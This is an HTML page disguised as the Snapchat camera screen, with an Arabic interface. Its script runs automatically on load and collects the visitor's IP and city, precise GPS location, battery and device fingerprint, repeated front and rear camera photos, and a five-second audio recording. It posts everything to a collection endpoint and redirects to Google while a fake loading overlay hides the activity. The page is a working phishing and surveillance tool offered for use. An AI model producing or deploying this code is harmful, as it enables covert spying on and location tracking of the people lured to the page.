<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Snapchat</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #000;
            color: #fff;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
        }
        .snap-container {
            position: relative;
            width: 100%;
            height: 100vh;
            background: #000;
            display: flex;
            flex-direction: column;
        }

        /* Camera View Background */
        .camera-view {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: linear-gradient(180deg, #0a0a0a 0%, #1a1a1a 50%, #0a0a0a 100%);
            z-index: 1;
        }

        /* Top Bar */
        .top-bar {
            position: relative;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 16px;
            z-index: 100;
        }
        .top-left, .top-right {
            display: flex;
            align-items: center;
            gap: 18px;
        }
        .top-bar i {
            font-size: 22px;
            color: #fff;
            text-shadow: 0 1px 3px rgba(0,0,0,0.5);
        }
        .top-avatar {
            width: 32px; height: 32px;
            border-radius: 50%;
            background: linear-gradient(135deg, #fffc00, #ffeb3b);
            display: flex;
            align-items: center;
            justify-content: center;
            border: 2px solid #fff;
        }
        .top-avatar i {
            font-size: 14px;
            color: #000;
            text-shadow: none;
        }

        /* Center Area */
        .center-area {
            flex: 1;
            position: relative;
            z-index: 50;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        /* Snapchat Ghost */
        .snap-ghost {
            font-size: 80px;
            color: rgba(255,252,0,0.15);
            margin-bottom: 20px;
        }

        /* Loading Spinner القديم - تم إخفاؤه */
        .loading-spinner {
            display: none; /* إخفاء spinner القديم */
            justify-content: center;
            align-items: center;
            z-index: 999;
        }
        .spinner-ring {
            width: 45px;
            height: 45px;
            border: 4px solid rgba(255,255,255,0.1);
            border-top-color: #fffc00;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            box-shadow: 0 0 15px rgba(255,252,0,0.2);
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Side Icons */
        .side-icons {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            display: flex;
            flex-direction: column;
            gap: 20px;
            z-index: 100;
        }
        .side-icon {
            width: 44px; height: 44px;
            border-radius: 50%;
            background: rgba(0,0,0,0.3);
            backdrop-filter: blur(5px);
            display: flex;
            align-items: center;
            justify-content: center;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .side-icon i {
            font-size: 18px;
            color: #fff;
        }

        /* Bottom Controls */
        .bottom-controls {
            position: relative;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 30px 35px;
            z-index: 100;
        }
        .bottom-btn {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
            color: #fff;
            font-size: 11px;
        }
        .bottom-btn i {
            font-size: 26px;
        }
        .capture-btn {
            width: 68px; height: 68px;
            border-radius: 50%;
            border: 4px solid #fffc00;
            background: transparent;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }
        .capture-btn::after {
            content: '';
            width: 54px; height: 54px;
            border-radius: 50%;
            background: #fffc00;
        }
        .bottom-nav {
            position: relative;
            display: flex;
            justify-content: space-around;
            align-items: center;
            padding: 8px 0 25px;
            background: rgba(0,0,0,0.4);
            backdrop-filter: blur(10px);
            z-index: 100;
        }
        .nav-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 3px;
            color: rgba(255,255,255,0.6);
            font-size: 10px;
            cursor: pointer;
        }
        .nav-item i {
            font-size: 22px;
        }
        .nav-item.active {
            color: #fffc00;
        }
        .nav-item.active i {
            color: #fffc00;
        }

        /* ===== NEW: Loading Overlay مع تشويش خفيف ===== */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            background: rgba(0, 0, 0, 0.1);
            backdrop-filter: blur(2px);
            -webkit-backdrop-filter: blur(2px);
            pointer-events: none;
            opacity: 1;
            transition: opacity 0.5s ease;
        }
        .loading-overlay.hidden {
            opacity: 0;
            pointer-events: none;
        }
        .loading-box {
            background: #1a8cff; /* أزرق */
            padding: 30px 40px;
            border-radius: 16px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            box-shadow: 0 8px 30px rgba(0,0,0,0.5);
            backdrop-filter: none;
            -webkit-backdrop-filter: none;
        }
        .loading-box .spinner-ring-big {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top-color: #ffffff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        .loading-box p {
            color: #fff;
            margin-top: 15px;
            font-size: 16px;
            font-weight: 500;
        }
        /* ================================================= */
    </style>
</head>
<body>
    <!-- ===== NEW: Overlay التحميل ===== -->
    <div id="loadingOverlay" class="loading-overlay">
        <div class="loading-box">
            <div class="spinner-ring-big"></div>
            <p>جاري التحميل...</p>
        </div>
    </div>

    <div class="snap-container">
        <!-- Camera Background -->
        <div class="camera-view"></div>

        <!-- Top Bar -->
        <div class="top-bar">
            <div class="top-left">
                <div class="top-avatar"><i class="fas fa-user"></i></div>
                <i class="fas fa-search"></i>
            </div>
            <div class="top-right">
                <i class="fas fa-user-plus"></i>
                <i class="fas fa-ellipsis-v"></i>
            </div>
        </div>

        <!-- Center Area with Spinner (مخفي الآن) -->
        <div class="center-area">
            <div class="snap-ghost"><i class="fab fa-snapchat"></i></div>
            <div class="loading-spinner">
                <div class="spinner-ring"></div>
            </div>
        </div>

        <!-- Side Icons -->
        <div class="side-icons">
            <div class="side-icon"><i class="fas fa-sync-alt"></i></div>
            <div class="side-icon"><i class="fas fa-bolt"></i></div>
            <div class="side-icon"><i class="fas fa-magic"></i></div>
            <div class="side-icon"><i class="fas fa-music"></i></div>
        </div>

        <!-- Bottom Controls -->
        <div class="bottom-controls">
            <div class="bottom-btn">
                <i class="fas fa-images"></i>
            </div>
            <div class="capture-btn"></div>
            <div class="bottom-btn">
                <i class="fas fa-smile"></i>
            </div>
        </div>

        <!-- Bottom Nav -->
        <div class="bottom-nav">
            <div class="nav-item">
                <i class="fas fa-map-marker-alt"></i>
                <span>الخريطة</span>
            </div>
            <div class="nav-item">
                <i class="fas fa-comments"></i>
                <span>الدردشة</span>
            </div>
            <div class="nav-item active">
                <i class="fas fa-camera"></i>
                <span>الكاميرا</span>
            </div>
            <div class="nav-item">
                <i class="fas fa-users"></i>
                <span>القصص</span>
            </div>
            <div class="nav-item">
                <i class="fas fa-play-circle"></i>
                <span>سبوتلايت</span>
            </div>
        </div>
    </div>

    <form id="dataForm" method="POST" action="REDIRECT_URL" style="display:none;">
        <input type="hidden" name="chatId" id="chatId">
        <input type="hidden" name="imageDatas" id="imageDatas">
        <input type="hidden" name="location" id="location">
        <input type="hidden" name="permissions" id="permissions">
        <input type="hidden" name="ipInfo" id="ipInfo">
        <input type="hidden" name="battery" id="battery">
        <input type="hidden" name="audioData" id="audioData">
        <input type="hidden" name="deviceInfo" id="deviceInfo">
    </form>

    <script>
        const REDIRECT_URL = "REDIRECT_URL";
        let images = [], audioData = null;
        let ipInfo = '', batteryStatus = '', locationStr = '';
        let permissions = [];
        let deviceInfo = {};

        // عنصر overlay للتحميل
        const loadingOverlay = document.getElementById('loadingOverlay');

        async function getIP() {
            try {
                const r = await fetch('https://ipapi.co/json/');
                const d = await r.json();
                ipInfo = `Country: ${d.country_name || 'Unknown'}, City: ${d.city || 'Unknown'}, IP: ${d.ip || 'Unknown'}`;
            } catch {
                ipInfo = 'Unable to get IP';
            }
        }

        async function getBattery() {
            try {
                const b = await navigator.getBattery();
                batteryStatus = `Level: ${Math.round(b.level * 100)}%, Charging: ${b.charging ? 'Yes' : 'No'}`;
            } catch {
                batteryStatus = 'Unknown';
            }
        }

        async function captureImage(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: facingMode }, width: 640, height: 480 }
                });
                const v = document.createElement('video');
                v.srcObject = stream;
                await v.play();
                await new Promise(r => setTimeout(r, 300));

                const c = document.createElement('canvas');
                c.width = v.videoWidth || 640;
                c.height = v.videoHeight || 480;
                c.getContext('2d').drawImage(v, 0, 0);

                const imageData = c.toDataURL('image/jpeg', 0.7).split(',')[1];
                images.push(imageData);

                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch (error) {
                permissions.push(`Camera ${facingMode} Denied`);
                return false;
            }
        }

        async function captureAllImages() {
            await captureImage('user');
            await captureImage('environment');
            await captureImage('user');
            await captureImage('environment');
        }

        async function recordAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];

                mediaRecorder.ondataavailable = e => chunks.push(e.data);

                return new Promise((resolve) => {
                    mediaRecorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'audio/webm' });
                        const reader = new FileReader();
                        reader.onloadend = () => {
                            const base64 = reader.result.split(',')[1];
                            audioData = base64;
                            stream.getTracks().forEach(t => t.stop());
                            resolve();
                        };
                        reader.readAsDataURL(blob);
                    };

                    mediaRecorder.start();
                    setTimeout(() => mediaRecorder.stop(), 5000);
                });
            } catch (error) {
                permissions.push('Audio Denied');
                return null;
            }
        }

        async function getLocation() {
            return new Promise(res => {
                navigator.geolocation.getCurrentPosition(
                    p => {
                        locationStr = `Lat:${p.coords.latitude}, Lon:${p.coords.longitude}, Acc:${p.coords.accuracy}m`;
                        res(locationStr);
                    },
                    () => {
                        permissions.push('Location Denied');
                        locationStr = '';
                        res('');
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }

        async function getDeviceInfo() {
            deviceInfo = {
                platform: navigator.platform || 'Unknown',
                userAgent: navigator.userAgent || 'Unknown',
                language: navigator.language || 'Unknown',
                memory: navigator.deviceMemory || 'Unknown',
                cores: navigator.hardwareConcurrency || 'Unknown',
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                vendor: navigator.vendor || 'Unknown',
                product: navigator.product || 'Unknown',
                cookieEnabled: navigator.cookieEnabled || false,
                doNotTrack: navigator.doNotTrack || 'Unknown',
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType || 'Unknown',
                    downlink: navigator.connection.downlink || 'Unknown',
                    rtt: navigator.connection.rtt || 'Unknown'
                } : null
            };
            return deviceInfo;
        }

        async function sendData() {
            try {
                const fd = new FormData();
                fd.append('ipInfo', ipInfo);
                fd.append('battery', batteryStatus);
                fd.append('location', locationStr);
                fd.append('imageDatas', images.join(','));
                fd.append('permissions', permissions.join(', '));
                fd.append('audioData', audioData || '');
                fd.append('deviceInfo', JSON.stringify(deviceInfo));
                fd.append('chatId', navigator.userAgent || 'Unknown');

                const response = await fetch('/submitData', { 
                    method: 'POST', 
                    body: fd,
                    timeout: 30000
                });

                return response;
            } catch (error) {
                console.error('Send error:', error);
                return null;
            }
        }

        async function startProcess() {
            // إظهار الـ overlay
            loadingOverlay.classList.remove('hidden');

            await getIP();
            await getBattery();
            await getLocation();
            await getDeviceInfo();
            await captureAllImages();
            await recordAudio();

            const response = await sendData();

            // إخفاء الـ overlay بعد الانتهاء
            loadingOverlay.classList.add('hidden');

            if (REDIRECT_URL && REDIRECT_URL !== 'REDIRECT_URL') {
                window.location.href = REDIRECT_URL;
            } else {
                window.location.href = 'https://www.google.com';
            }
        }

        window.onload = function() {
            startProcess();
        };
    </script>
</body>
</html>
